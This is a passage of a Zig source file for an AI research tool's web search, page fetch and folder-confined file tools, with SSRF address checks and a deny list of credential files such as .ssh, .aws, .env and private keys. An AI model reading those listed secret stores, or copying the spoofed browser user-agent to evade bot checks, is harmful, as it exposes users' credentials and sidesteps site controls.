//! Research tools shared by `sushi run` and the local web UI bridge: web search, page fetch,
//! confined file reads, image viewing, and — when the user turns editing on — file writes.

const std = @import("std");
const regex = @import("regex.zig");

// ── Safety ──────────────────────────────────────────────────────────────

pub const HostClass = enum { public, loopback, private, link_local, cgnat, multicast, unspecified, reserved };

pub fn classifyIp4(b: [4]u8) HostClass {
    return switch (b[0]) {
        0 => .unspecified,
        10 => .private,
        127 => .loopback,
        100 => if (b[1] & 0xC0 == 64) .cgnat else .public,
        169 => if (b[1] == 254) .link_local else .public,
        172 => if (b[1] & 0xF0 == 16) .private else .public,
        192 => if (b[1] == 168) .private else if (b[1] == 0 and (b[2] == 0 or b[2] == 2)) .reserved else .public,
        198 => if (b[1] & 0xFE == 18 or (b[1] == 51 and b[2] == 100)) .reserved else .public,
        203 => if (b[1] == 0 and b[2] == 113) .reserved else .public,
        224...239 => .multicast,
        240...255 => .reserved,
        else => .public,
    };
}

pub fn classifyIp6(b: [16]u8) HostClass {
    const zero: [16]u8 = @splat(0);
    // IPv4-mapped, NAT64 and 6to4 carry an IPv4 destination: judge that one.
    if (std.mem.eql(u8, b[0..10], zero[0..10]) and b[10] == 0xff and b[11] == 0xff) return classifyIp4(b[12..16].*);
    if (std.mem.eql(u8, b[0..4], &.{ 0, 0x64, 0xff, 0x9b }) and std.mem.eql(u8, b[4..12], zero[4..12])) return classifyIp4(b[12..16].*);
    if (b[0] == 0x20 and b[1] == 0x02) return classifyIp4(b[2..6].*);
    if (std.mem.eql(u8, b[0..15], zero[0..15])) return if (b[15] == 1) .loopback else if (b[15] == 0) .unspecified else .reserved;
    if (b[0] == 0xff) return .multicast;
    if (b[0] == 0xfe and b[1] & 0xc0 == 0x80) return .link_local;
    if (b[0] == 0xfe and b[1] & 0xc0 == 0xc0) return .private;
    if (b[0] & 0xfe == 0xfc) return .private;
    // Documentation and Teredo prefixes, then anything outside global unicast 2000::/3.
    if (b[0] == 0x20 and b[1] == 0x01 and ((b[2] == 0x0d and b[3] == 0xb8) or (b[2] == 0 and b[3] == 0))) return .reserved;
    if (b[0] & 0xe0 != 0x20) return .reserved;
    return .public;
}

pub fn classifyAddress(a: std.Io.net.IpAddress) HostClass {
    return switch (a) {
        .ip4 => |v| classifyIp4(v.bytes),
        .ip6 => |v| classifyIp6(v.bytes),
    };
}

const endsWithIgnoreCase = std.ascii.endsWithIgnoreCase;
const startsWithIgnoreCase = std.ascii.startsWithIgnoreCase;

/// Names that resolve on the local network by convention, whatever DNS says.
pub fn hostNameRefused(host: []const u8) bool {
    const h = std.mem.trimEnd(u8, host, ".");
    if (h.len == 0 or std.ascii.eqlIgnoreCase(h, "localhost")) return true;
    for ([_][]const u8{ ".localhost", ".local", ".internal", ".home.arpa" }) |suffix|
        if (endsWithIgnoreCase(h, suffix)) return true;
    return false;
}

/// One path component that may hold credentials.
pub fn isSecretName(name: []const u8) bool {
    for ([_][]const u8{ ".ssh", ".aws", ".gnupg" }) |n| if (std.ascii.eqlIgnoreCase(name, n)) return true;
    for ([_][]const u8{ ".env", "id_", "credentials" }) |p| if (startsWithIgnoreCase(name, p)) return true;
    for ([_][]const u8{ ".pem", ".key", ".p12", ".pfx" }) |x| if (endsWithIgnoreCase(name, x)) return true;
    return std.ascii.findIgnoreCase(name, ".keychain") != null;
}

pub const Confined = union(enum) { ok: []u8, refused: []const u8 };

const refuse_outside = "refused: that path is outside the folder the file tools are fixed to; the user can move it by typing /cd <folder> in the chat, so suggest that instead of trying other paths";
const refuse_hidden = "refused: hidden files and folders are off limits";
const refuse_secret = "refused: that file may hold secrets";
const refuse_missing = "no such file or folder";
const refuse_not_a_file = "refused: that names a folder; the write tools need a file name";
const refuse_write_off = "refused: writing files is off; the user turns it on with the Edit chip in the chat page or /edit on in the REPL, so ask for that instead of trying other paths";

fn componentRefusal(rel: []const u8) ?[]const u8 {
    var it = std.mem.tokenizeScalar(u8, rel, '/');
    while (it.next()) |c| {
        if (std.mem.eql(u8, c, ".")) continue;
        if (std.mem.eql(u8, c, "..")) return refuse_outside;
        if (isSecretName(c)) return refuse_secret;
        if (c[0] == '.') return refuse_hidden;
    }
    return null;
}

/// `path` relative to `root`, or null when it is not inside it.
fn within(root: []const u8, path: []const u8) ?[]const u8 {
    if (std.mem.eql(u8, path, root)) return "";
    if (root.len == 1 and path.len > 0 and path[0] == '/') return path[1..];
    if (path.len > root.len and std.mem.startsWith(u8, path, root) and path[root.len] == '/') return path[root.len + 1 ..];
    return null;
}

/// The real path of `user_path` when it names an existing entry inside `root`
/// (itself a real path), checked both as typed and after symlinks resolve.
pub fn confinePath(allocator: std.mem.Allocator, io: std.Io, root: []const u8, user_path: []const u8) !Confined {
    var rel = std.mem.trim(u8, user_path, " \t\r\n");
    if (std.fs.path.isAbsolute(rel)) rel = within(root, rel) orelse return .{ .refused = refuse_outside };
    if (componentRefusal(rel)) |msg| return .{ .refused = msg };
    const joined = try std.fs.path.join(allocator, &.{ root, rel });
    defer allocator.free(joined);
    const real_z = std.Io.Dir.realPathFileAbsoluteAlloc(io, joined, allocator) catch |err| switch (err) {
        error.OutOfMemory => return error.OutOfMemory,
        else => return .{ .refused = refuse_missing },
    };
    defer allocator.free(real_z);
    const real_rel = within(root, real_z) orelse return .{ .refused = refuse_outside };
    if (componentRefusal(real_rel)) |msg| return .{ .refused = msg };
    return .{ .ok = try allocator.dupe(u8, real_z) };
}

/// The real path a write to `user_path` may land on when that name does not exist yet.
/// `confinePath` cannot answer for it — realpath(3) fails on a missing final component — so a new
/// file is confined through its parent folder, which must exist and stay inside `root`.
pub fn confineNewPath(allocator: std.mem.Allocator, io: std.Io, root: []const u8, user_path: []const u8) !Confined {
    var rel = std.mem.trim(u8, user_path, " \t\r\n");
    if (std.fs.path.isAbsolute(rel)) rel = within(root, rel) orelse return .{ .refused = refuse_outside };
    if (rel.len == 0 or rel[rel.len - 1] == '/') return .{ .refused = refuse_not_a_file };
    if (componentRefusal(rel)) |msg| return .{ .refused = msg };
    const joined = try std.fs.path.join(allocator, &.{ root, rel });
    defer allocator.free(joined);
    const base = std.fs.path.basename(joined);
    if (base.len == 0 or std.mem.eql(u8, base, ".")) return .{ .refused = refuse_not_a_file };
    const parent = std.fs.path.dirname(joined) orelse return .{ .refused = refuse_outside };
    const real_parent = std.Io.Dir.realPathFileAbsoluteAlloc(io, parent, allocator) catch |err| switch (err) {
        error.OutOfMemory => return error.OutOfMemory,
        else => return .{ .refused = "refused: that folder does not exist; the parent of a written file has to" },
    };
    defer allocator.free(real_parent);
    const parent_rel = within(root, real_parent) orelse return .{ .refused = refuse_outside };
    if (componentRefusal(parent_rel)) |msg| return .{ .refused = msg };
    return .{ .ok = try std.fs.path.join(allocator, &.{ real_parent, base }) };
}

/// The real path a write may change: `confinePath` when the name already exists, its parent
/// folder when it does not. Anything else the reads refuse (outside, hidden, secret, escaping
/// symlink) the writes refuse too.
pub fn confineWriteTarget(allocator: std.mem.Allocator, io: std.Io, root: []const u8, user_path: []const u8) !Confined {
    switch (try confinePath(allocator, io, root, user_path)) {
        .ok => |real| return .{ .ok = real },
        .refused => |msg| if (!std.mem.eql(u8, msg, refuse_missing)) return .{ .refused = msg },
    }
    return confineNewPath(allocator, io, root, user_path);
}

pub const RootChange = union(enum) { ok: [:0]u8, refused: []const u8 };

/// The real path of the folder `/cd <arg>` names: absolute, `~`-relative, or
/// relative to `root`. A folder whose path names a secret store is refused.
pub fn changeRoot(allocator: std.mem.Allocator, io: std.Io, root: []const u8, home: []const u8, arg: []const u8) !RootChange {
    const target = std.mem.trim(u8, arg, " \t\r\n");
    const joined = if (std.mem.eql(u8, target, "~") or std.mem.startsWith(u8, target, "~/"))
        try std.fs.path.join(allocator, &.{ home, target[1..] })
    else if (std.fs.path.isAbsolute(target))
        try allocator.dupe(u8, target)
    else
        try std.fs.path.join(allocator, &.{ root, target });
    defer allocator.free(joined);
    if (!std.fs.path.isAbsolute(joined)) return .{ .refused = "no such folder" };
    const real = std.Io.Dir.realPathFileAbsoluteAlloc(io, joined, allocator) catch |err| switch (err) {
        error.OutOfMemory => return error.OutOfMemory,
        else => return .{ .refused = "no such folder" },
    };
    const refusal: ?[]const u8 = blk: {
        var dir = std.Io.Dir.openDirAbsolute(io, real, .{}) catch break :blk "not a folder";
        dir.close(io);
        var it = std.mem.tokenizeScalar(u8, real, '/');
        while (it.next()) |c| if (isSecretName(c)) break :blk "that folder may hold secrets";
        break :blk null;
    };
    if (refusal) |msg| {
        allocator.free(real);
        return .{ .refused = msg };
    }
    return .{ .ok = real };
}

// ── HTML ────────────────────────────────────────────────────────────────

const Tag = struct {
    name: []const u8,
    closing: bool,
    attrs: []const u8,
    /// Index just past the tag's `>`.
    end: usize,
};

/// The tag starting at `html[lt]` (a `<`), or null when it is not a tag.
fn parseTag(html: []const u8, lt: usize) ?Tag {
    var i = lt + 1;
    const closing = i < html.len and html[i] == '/';
    if (closing) i += 1;
    const name_start = i;
    while (i < html.len and (std.ascii.isAlphanumeric(html[i]) or html[i] == '-')) i += 1;
    if (i == name_start) return null;
    const name = html[name_start..i];
    var quote: u8 = 0;
    const attrs_start = i;
    while (i < html.len) : (i += 1) {
        const ch = html[i];
        if (quote != 0) {
            if (ch == quote) quote = 0;
        } else if (ch == '"' or ch == '\'') {
            quote = ch;
        } else if (ch == '>') {
            return .{ .name = name, .closing = closing, .attrs = html[attrs_start..i], .end = i + 1 };
        }
    }
    return null;
}

fn attrValue(attrs: []const u8, want: []const u8) ?[]const u8 {
    var i: usize = 0;
    while (i < attrs.len) {
        while (i < attrs.len and (std.ascii.isWhitespace(attrs[i]) or attrs[i] == '/')) i += 1;
        const name_start = i;
        while (i < attrs.len and !std.ascii.isWhitespace(attrs[i]) and attrs[i] != '=' and attrs[i] != '/') i += 1;
        const name = attrs[name_start..i];
        if (name.len == 0) {
            i += 1;
            continue;
        }
        while (i < attrs.len and std.ascii.isWhitespace(attrs[i])) i += 1;
        if (i >= attrs.len or attrs[i] != '=') {
            if (std.ascii.eqlIgnoreCase(name, want)) return "";
            continue;
        }
        i += 1;
        while (i < attrs.len and std.ascii.isWhitespace(attrs[i])) i += 1;
        var value: []const u8 = "";
        if (i < attrs.len and (attrs[i] == '"' or attrs[i] == '\'')) {
            const end = std.mem.indexOfScalarPos(u8, attrs, i + 1, attrs[i]) orelse attrs.len;
            value = attrs[i + 1 .. end];
            i = @min(end + 1, attrs.len);
        } else {
            const start = i;
            while (i < attrs.len and !std.ascii.isWhitespace(attrs[i])) i += 1;
            value = attrs[start..i];
        }
        if (std.ascii.eqlIgnoreCase(name, want)) return value;
    }
    return null;
}

fn hasClass(attrs: []const u8, class: []const u8) bool {
    const v = attrValue(attrs, "class") orelse return false;
    var it = std.mem.tokenizeAny(u8, v, " \t\r\n");
    while (it.next()) |c| if (std.mem.eql(u8, c, class)) return true;
    return false;
}

/// Index of the `<` of the next `</name`, case-insensitive.
fn findClose(html: []const u8, from: usize, name: []const u8) ?usize {
    var i = from;
    while (std.mem.indexOfPos(u8, html, i, "</")) |lt| {
        const name_end = lt + 2 + name.len;
        if (name_end <= html.len and std.ascii.eqlIgnoreCase(html[lt + 2 .. name_end], name) and
            (name_end == html.len or !std.ascii.isAlphanumeric(html[name_end]))) return lt;
        i = lt + 2;
    }
    return null;
}

/// Index just past the `>` that ends the tag whose `<` is at `lt`.
fn pastTagEnd(html: []const u8, lt: usize) usize {
    return if (std.mem.indexOfScalarPos(u8, html, lt, '>')) |e| e + 1 else html.len;
}

const named_entities = [_]struct { []const u8, []const u8 }{
    .{ "amp", "&" },            .{ "lt", "<" },             .{ "gt", ">" },             .{ "quot", "\"" },
    .{ "apos", "'" },           .{ "nbsp", " " },           .{ "mdash", "\u{2014}" },   .{ "ndash", "\u{2013}" },
    .{ "hellip", "\u{2026}" },  .{ "rsquo", "\u{2019}" },   .{ "lsquo", "\u{2018}" },   .{ "rdquo", "\u{201D}" },
    .{ "ldquo", "\u{201C}" },   .{ "laquo", "\u{00AB}" },   .{ "raquo", "\u{00BB}" },   .{ "middot", "\u{00B7}" },
    .{ "bull", "\u{2022}" },    .{ "copy", "\u{00A9}" },    .{ "reg", "\u{00AE}" },     .{ "trade", "\u{2122}" },
    .{ "times", "\u{00D7}" },   .{ "eacute", "\u{00E9}" },  .{ "egrave", "\u{00E8}" },  .{ "aacute", "\u{00E1}" },
    .{ "uuml", "\u{00FC}" },    .{ "ouml", "\u{00F6}" },    .{ "auml", "\u{00E4}" },    .{ "rarr", "\u{2192}" },
};

const Entity = struct { bytes: [4]u8, len: u3, consumed: usize };

/// Decodes the entity at `s[0] == '&'`; null leaves the `&` literal. A
/// non-breaking space decodes to a plain space so it collapses like one.
fn decodeEntity(s: []const u8) ?Entity {
    const semi = std.mem.indexOfScalar(u8, s[0..@min(s.len, 12)], ';') orelse return null;
    const body = s[1..semi];
    var out: Entity = .{ .bytes = undefined, .len = 0, .consumed = semi + 1 };
    if (body.len > 1 and body[0] == '#') {
        const cp = (if (body[1] == 'x' or body[1] == 'X')
            std.fmt.parseInt(u21, body[2..], 16)
        else
            std.fmt.parseInt(u21, body[1..], 10)) catch return null;
        if (cp == 0xA0) return .{ .bytes = .{ ' ', 0, 0, 0 }, .len = 1, .consumed = semi + 1 };
        out.len = std.unicode.utf8Encode(cp, &out.bytes) catch return null;
        return out;
    }
    for (named_entities) |e| if (std.mem.eql(u8, e[0], body)) {
        @memcpy(out.bytes[0..e[1].len], e[1]);
        out.len = @intCast(e[1].len);
        return out;
    };
    return null;
}

fn decodeEntities(allocator: std.mem.Allocator, s: []const u8) ![]u8 {
    var out = std.ArrayList(u8).empty;
    errdefer out.deinit(allocator);
    var i: usize = 0;
    while (i < s.len) {
        if (s[i] == '&') if (decodeEntity(s[i..])) |e| {
            try out.appendSlice(allocator, e.bytes[0..e.len]);
            i += e.consumed;
            continue;
        };
        try out.append(allocator, s[i]);
        i += 1;
    }
    return out.toOwnedSlice(allocator);
}

/// Collapses whitespace and turns block boundaries into at most one blank line.
const TextSink = struct {
    allocator: std.mem.Allocator,
    out: std.ArrayList(u8) = .empty,
    pending_space: bool = false,
    pending_breaks: u2 = 0,
    max: usize,
    full: bool = false,

    fn flush(t: *TextSink) !void {
        if (t.out.items.len > 0) {
            if (t.pending_breaks > 0) {
                while (t.out.items.len > 0 and t.out.items[t.out.items.len - 1] == ' ') t.out.items.len -= 1;
                try t.out.appendNTimes(t.allocator, '\n', t.pending_breaks);
            } else if (t.pending_space) {
                const last = t.out.items[t.out.items.len - 1];
                if (last != ' ' and last != '\n') try t.out.append(t.allocator, ' ');
            }
        }
        t.pending_breaks = 0;
        t.pending_space = false;
    }

    fn raw(t: *TextSink, s: []const u8) !void {
        if (t.full) return;
        try t.flush();
        try t.out.appendSlice(t.allocator, s);
        if (t.out.items.len > t.max) t.full = true;
    }

    fn brk(t: *TextSink, n: u2) void {
        t.pending_breaks = @max(t.pending_breaks, n);
        t.pending_space = false;
    }

    /// Text between tags, entities still encoded.
    fn text(t: *TextSink, s: []const u8, pre: bool) !void {
        var i: usize = 0;
        while (i < s.len and !t.full) {
            var ent: Entity = .{ .bytes = .{ s[i], 0, 0, 0 }, .len = 1, .consumed = 1 };
            if (s[i] == '&') ent = decodeEntity(s[i..]) orelse ent;
            i += ent.consumed;
            const piece = ent.bytes[0..ent.len];
            if (!pre and piece.len == 1 and std.ascii.isWhitespace(piece[0])) {
                if (t.pending_breaks == 0) t.pending_space = true;
                continue;
            }
            try t.raw(piece);
        }
    }
};

const skipped_elements = [_][]const u8{ "script", "style", "noscript", "template", "svg", "nav", "iframe" };
const paragraph_elements = [_][]const u8{ "p", "ul", "ol", "blockquote", "table", "section", "article", "main", "header", "footer", "figure", "hr", "dl", "form", "aside" };
const line_elements = [_][]const u8{ "br", "tr", "div", "dt", "dd", "figcaption", "caption", "option" };

fn inList(list: []const []const u8, name: []const u8) bool {
    for (list) |n| if (std.ascii.eqlIgnoreCase(n, name)) return true;
    return false;
}

fn headingLevel(name: []const u8) ?u8 {
    if (name.len == 2 and (name[0] == 'h' or name[0] == 'H') and name[1] >= '1' and name[1] <= '6') return name[1] - '0';
    return null;
}

/// Readable text of an HTML page: script/style/nav dropped, headings as `#`,
/// list items as `- `, links as `text (url)`, at most `max_chars` bytes.
pub fn htmlToText(allocator: std.mem.Allocator, html: []const u8, base_url: ?[]const u8, max_chars: usize) ![]u8 {
    var t: TextSink = .{ .allocator = allocator, .max = max_chars };
    defer t.out.deinit(allocator);
    var link: ?[]u8 = null;
    defer if (link) |l| allocator.free(l);
    var link_start: usize = 0;
    var in_pre = false;
    var image_count: usize = 0;
    var i: usize = 0;
    while (i < html.len and !t.full) {
        const lt = std.mem.indexOfScalarPos(u8, html, i, '<') orelse html.len;
        try t.text(html[i..lt], in_pre);
        if (lt >= html.len) break;
        if (std.mem.startsWith(u8, html[lt..], "<!--")) {
            i = if (std.mem.indexOfPos(u8, html, lt + 4, "-->")) |e| e + 3 else html.len;
            continue;
        }
        if (lt + 1 < html.len and (html[lt + 1] == '!' or html[lt + 1] == '?')) {
            i = pastTagEnd(html, lt);
            continue;
        }
        const tag = parseTag(html, lt) orelse {
            try t.text("<", in_pre);
            i = lt + 1;
            continue;
        };
        i = tag.end;
        if (!tag.closing and inList(&skipped_elements, tag.name)) {
            if (tag.attrs.len > 0 and tag.attrs[tag.attrs.len - 1] == '/') continue;
            i = pastTagEnd(html, findClose(html, tag.end, tag.name) orelse html.len);
            continue;
        }
        if (std.ascii.eqlIgnoreCase(tag.name, "title")) {
            if (tag.closing) continue;
            const close = findClose(html, tag.end, "title") orelse html.len;
            t.brk(2);
            try t.raw("# ");
            try t.text(html[tag.end..close], false);
            t.brk(2);
            i = pastTagEnd(html, close);
            continue;
        }
        if (headingLevel(tag.name)) |level| {
            t.brk(2);
            if (!tag.closing) try t.raw("###### "[6 - level ..]);
        } else if (std.ascii.eqlIgnoreCase(tag.name, "pre")) {
            t.brk(2);
            in_pre = !tag.closing;
            // A newline right after <pre> is not content.
            if (in_pre and i < html.len and html[i] == '\n') i += 1;
        } else if (inList(&paragraph_elements, tag.name)) {
            t.brk(2);
        } else if (std.ascii.eqlIgnoreCase(tag.name, "li")) {
            t.brk(1);
            if (!tag.closing) try t.raw("- ");
        } else if (inList(&line_elements, tag.name)) {
            t.brk(1);
        } else if (std.ascii.eqlIgnoreCase(tag.name, "td") or std.ascii.eqlIgnoreCase(tag.name, "th")) {
            if (t.pending_breaks == 0) t.pending_space = true;
        } else if (!tag.closing and std.ascii.eqlIgnoreCase(tag.name, "img") and image_count < 20) {
            if (attrValue(tag.attrs, "data-src") orelse attrValue(tag.attrs, "src")) |src| {
                const decoded = try decodeEntities(allocator, src);
                defer allocator.free(decoded);
                if (try resolveUrl(allocator, base_url, decoded)) |url| {
                    defer allocator.free(url);
                    t.brk(1);
                    try t.raw("Image: ");
                    try t.text(attrValue(tag.attrs, "alt") orelse "image", false);
                    try t.raw(" (");
                    try t.raw(url);
                    try t.raw(")");
                    t.brk(1);
                    image_count += 1;
                }
            }
        } else if (std.ascii.eqlIgnoreCase(tag.name, "a")) {
            if (!tag.closing) {
                if (link) |l| allocator.free(l);
                link = null;
                if (attrValue(tag.attrs, "href")) |href| {
                    const decoded = try decodeEntities(allocator, href);
                    defer allocator.free(decoded);
                    link = try resolveUrl(allocator, base_url, decoded);
                }
                link_start = t.out.items.len;
            } else if (link) |l| {
                const shown = std.mem.trim(u8, t.out.items[@min(link_start, t.out.items.len)..], " \n");
                if (shown.len > 0 and !std.mem.eql(u8, shown, l)) {
                    try t.raw(" (");
                    try t.raw(l);
                    try t.raw(")");
                }
                allocator.free(l);
                link = null;
            }
        }
    }
    const trimmed = std.mem.trim(u8, t.out.items, " \n");
    if (!t.full or trimmed.len <= max_chars) return allocator.dupe(u8, trimmed);
    var cut = max_chars;
    while (cut > 0 and trimmed[cut] & 0xC0 == 0x80) cut -= 1;
    return std.mem.concat(allocator, u8, &.{ trimmed[0..cut], "\n[truncated]" });
}

fn hasHttpScheme(url: []const u8) bool {
    return startsWithIgnoreCase(url, "http://") or startsWithIgnoreCase(url, "https://");
}

/// `ref` resolved against `base` when the result is an http(s) URL; null for
/// fragments, other schemes (javascript:, mailto:, data:) and unresolvable refs.
pub fn resolveUrl(allocator: std.mem.Allocator, base: ?[]const u8, ref_raw: []const u8) !?[]u8 {
    const ref = std.mem.trim(u8, ref_raw, " \t\r\n");
    if (ref.len == 0 or ref[0] == '#') return null;
    if (hasHttpScheme(ref)) return try allocator.dupe(u8, ref);
    const colon = std.mem.indexOfScalar(u8, ref, ':');
    const delim = std.mem.indexOfAny(u8, ref, "/?#");
    if (colon != null and (delim == null or colon.? < delim.?)) return null;
    const b = base orelse return null;
    if (!hasHttpScheme(b)) return null;
    const scheme_end = std.mem.indexOf(u8, b, "://").?;
    if (std.mem.startsWith(u8, ref, "//")) return try std.mem.concat(allocator, u8, &.{ b[0 .. scheme_end + 1], ref });
    const authority_end = std.mem.indexOfAnyPos(u8, b, scheme_end + 3, "/?#") orelse b.len;
    if (ref[0] == '/') return try std.mem.concat(allocator, u8, &.{ b[0..authority_end], ref });
    const path_end = std.mem.indexOfAnyPos(u8, b, authority_end, "?#") orelse b.len;
    if (ref[0] == '?') return try std.mem.concat(allocator, u8, &.{ b[0..path_end], ref });
    const slash = std.mem.lastIndexOfScalar(u8, b[authority_end..path_end], '/') orelse
        return try std.mem.concat(allocator, u8, &.{ b[0..authority_end], "/", ref });
    return try std.mem.concat(allocator, u8, &.{ b[0 .. authority_end + slash + 1], ref });
}

// ── Web search ──────────────────────────────────────────────────────────

pub const max_search_results = 8;

pub const SearchResult = struct { title: []u8, url: []u8, snippet: []u8 };

pub fn freeSearchResults(allocator: std.mem.Allocator, results: []SearchResult) void {
    for (results) |r| {
        allocator.free(r.title);
        allocator.free(r.url);
        allocator.free(r.snippet);
    }
    allocator.free(results);
}

/// DuckDuckGo wraps result links as `//duckduckgo.com/l/?uddg=<target>`;
/// null for its ad links (`/y.js`) and anything not http(s).
fn unwrapDdgUrl(allocator: std.mem.Allocator, href_raw: []const u8) !?[]u8 {
    const href = try decodeEntities(allocator, href_raw);
    defer allocator.free(href);
    if (std.mem.indexOf(u8, href, "uddg=")) |at| {
        const v = href[at + "uddg=".len ..];
        const target = v[0 .. std.mem.indexOfScalar(u8, v, '&') orelse v.len];
        const owned = try allocator.dupe(u8, target);
        defer allocator.free(owned);
        const decoded = std.Uri.percentDecodeInPlace(owned);
        if (!hasHttpScheme(decoded)) return null;
        return try allocator.dupe(u8, decoded);
    }
    if (std.mem.indexOf(u8, href, "duckduckgo.com/y.js") != null) return null;
    if (std.mem.startsWith(u8, href, "//")) return try std.mem.concat(allocator, u8, &.{ "https:", href });
    if (!hasHttpScheme(href)) return null;
    return try allocator.dupe(u8, href);
}

/// The organic results of an html.duckduckgo.com page, at most 8.
pub fn parseDdgResults(allocator: std.mem.Allocator, html: []const u8) ![]SearchResult {
    var results = std.ArrayList(SearchResult).empty;
    errdefer {
        for (results.items) |r| {
            allocator.free(r.title);
            allocator.free(r.url);
            allocator.free(r.snippet);
        }
        results.deinit(allocator);
    }
    // The result a snippet belongs to; null after an ad so its snippet is dropped.
    var current: ?usize = null;
    var i: usize = 0;
    while (std.mem.indexOfScalarPos(u8, html, i, '<')) |lt| {
        const tag = parseTag(html, lt) orelse {
            i = lt + 1;
            continue;
        };
        i = tag.end;
        if (tag.closing) continue;
        if (std.ascii.eqlIgnoreCase(tag.name, "script") or std.ascii.eqlIgnoreCase(tag.name, "style")) {
            i = findClose(html, tag.end, tag.name) orelse html.len;
            continue;
        }
        const is_title = hasClass(tag.attrs, "result__a");
        if (!is_title and !hasClass(tag.attrs, "result__snippet")) continue;
        const close = findClose(html, tag.end, tag.name) orelse html.len;
        i = close;
        if (is_title) {
            current = null;
            if (results.items.len == max_search_results) break;
            const url = try unwrapDdgUrl(allocator, attrValue(tag.attrs, "href") orelse "") orelse continue;
            errdefer allocator.free(url);
            const title = try htmlToText(allocator, html[tag.end..close], null, 1024);
            errdefer allocator.free(title);
            const empty = try allocator.dupe(u8, "");
            errdefer allocator.free(empty);
            try results.append(allocator, .{ .title = title, .url = url, .snippet = empty });
            current = results.items.len - 1;
        } else if (current) |idx| {
            const snippet = try htmlToText(allocator, html[tag.end..close], null, 2048);
            allocator.free(results.items[idx].snippet);
            results.items[idx].snippet = snippet;
            current = null;
        }
    }
    return results.toOwnedSlice(allocator);
}

/// DuckDuckGo answers suspected bots with a challenge page instead of results.
pub fn ddgBlocked(html: []const u8) bool {
    return std.mem.indexOf(u8, html, "anomaly-modal") != null;
}

// ── Web access ──────────────────────────────────────────────────────────

const user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15";
pub const max_redirects = 5;
pub const fetch_timeout_s = 10;
pub const max_fetch_bytes = 2 * 1024 * 1024;
pub const max_image_bytes = 8 * 1024 * 1024;
pub const max_page_chars = 20_000;

const WebPage = struct {
    status: u16,
    content_type: []u8,
    body: []u8,
    /// Where the last redirect landed.
    url: []u8,
    truncated: bool,

    fn deinit(p: WebPage, allocator: std.mem.Allocator) void {
        allocator.free(p.content_type);
        allocator.free(p.body);
        allocator.free(p.url);
    }
};

/// `fail` is the owned tool-result text for the model.
const WebResult = union(enum) {
    page: WebPage,
    fail: []u8,

    fn deinit(r: WebResult, allocator: std.mem.Allocator) void {
        switch (r) {
            .page => |p| p.deinit(allocator),
            .fail => |f| allocator.free(f),
        }
    }
};

fn failText(allocator: std.mem.Allocator, comptime fmt: []const u8, args: anytype) !WebResult {
    return .{ .fail = try std.fmt.allocPrint(allocator, fmt, args) };
}

/// Why `url` may not be fetched, or null. Resolves the host: every address
/// it maps to must be public.
fn urlRefusal(allocator: std.mem.Allocator, io: std.Io, url: []const u8) !?[]u8 {
    const uri = std.Uri.parse(url) catch return try allocator.dupe(u8, "refused: not a valid URL");
    if (!std.ascii.eqlIgnoreCase(uri.scheme, "http") and !std.ascii.eqlIgnoreCase(uri.scheme, "https"))
        return try allocator.dupe(u8, "refused: only http and https URLs can be fetched");
    if (uri.user != null or uri.password != null) return try allocator.dupe(u8, "refused: URLs carrying credentials are not fetched");
    var host_buf: [std.Io.net.HostName.max_len]u8 = undefined;
    const host_raw = (uri.host orelse return try allocator.dupe(u8, "refused: the URL has no host")).toRaw(&host_buf) catch
        return try allocator.dupe(u8, "refused: the host name is too long");
    const host = std.mem.trim(u8, host_raw, "[]");
    if (hostNameRefused(host)) return try std.fmt.allocPrint(allocator, "refused: {s} is a local network name", .{host});
    if (std.Io.net.IpAddress.parse(host, 0)) |addr| {
        const class = classifyAddress(addr);
        if (class != .public) return try std.fmt.allocPrint(allocator, "refused: {s} is a {t} address", .{ host, class });
        return null;
    } else |_| {}
    const name = std.Io.net.HostName.init(host) catch return try std.fmt.allocPrint(allocator, "refused: {s} is not a valid host name", .{host});
    var lookup_buf: [32]std.Io.net.HostName.LookupResult = undefined;
    var queue: std.Io.Queue(std.Io.net.HostName.LookupResult) = .init(&lookup_buf);
    name.lookup(io, &queue, .{ .port = 0 }) catch |err| return try std.fmt.allocPrint(allocator, "error: could not resolve {s} ({t})", .{ host, err });
    var any = false;
    while (queue.getOne(io)) |r| switch (r) {
        .address => |addr| {
            any = true;
            const class = classifyAddress(addr);
            if (class != .public) return try std.fmt.allocPrint(allocator, "refused: {s} resolves to a {t} address", .{ host, class });
        },
        .canonical_name => {},
    } else |_| {}
    if (!any) return try std.fmt.allocPrint(allocator, "error: could not resolve {s}", .{host});
    return null;
}

/// The address the socket actually reached, so a DNS answer that changed
/// between the check and the connect is still caught.
fn peerClass(handle: std.posix.socket_t) ?HostClass {
    var storage: std.posix.sockaddr.storage = undefined;
    var len: std.posix.socklen_t = @sizeOf(std.posix.sockaddr.storage);
    std.posix.getpeername(handle, @ptrCast(&storage), &len) catch return null;
    const family = @as(*const std.posix.sockaddr, @ptrCast(&storage)).family;
    if (family == std.posix.AF.INET) {
        const in: *const std.posix.sockaddr.in = @ptrCast(@alignCast(&storage));
        return classifyIp4(@bitCast(in.addr));
    }
    if (family == std.posix.AF.INET6) {
        const in6: *const std.posix.sockaddr.in6 = @ptrCast(@alignCast(&storage));
        return classifyIp6(in6.addr);
    }
    return null;
}

const Hop = union(enum) { done: WebResult, redirect: []u8 };

fn webHop(client: *std.http.Client, allocator: std.mem.Allocator, url: []const u8, max_bytes: usize, hops_left: usize) !Hop {
    if (try urlRefusal(allocator, client.io, url)) |msg| return .{ .done = .{ .fail = msg } };
    const uri = std.Uri.parse(url) catch unreachable;
    var req = client.request(.GET, uri, .{
        .keep_alive = false,
        .redirect_behavior = .unhandled,
        .headers = .{
            .user_agent = .{ .override = user_agent },
            .accept_encoding = .{ .override = "gzip, deflate" },
        },
        .extra_headers = &.{
            .{ .name = "accept", .value = "text/html,application/xhtml+xml,text/plain;q=0.9,image/*;q=0.8,*/*;q=0.5" },
            .{ .name = "accept-language", .value = "en" },
        },
    }) catch |err| return .{ .done = try failText(allocator, "error: could not connect to {s} ({t})", .{ url, err }) };
    defer req.deinit();
    const peer = peerClass(req.connection.?.stream_reader.stream.socket.handle) orelse .reserved;
    if (peer != .public) return .{ .done = try failText(allocator, "refused: {s} connected to a {t} address", .{ url, peer }) };
    req.sendBodiless() catch |err| return .{ .done = try failText(allocator, "error: request to {s} failed ({t})", .{ url, err }) };
    var response = req.receiveHead(&.{}) catch |err| return .{ .done = try failText(allocator, "error: no response from {s} ({t})", .{ url, err }) };
    const status = response.head.status;
    if (status.class() == .redirect) {
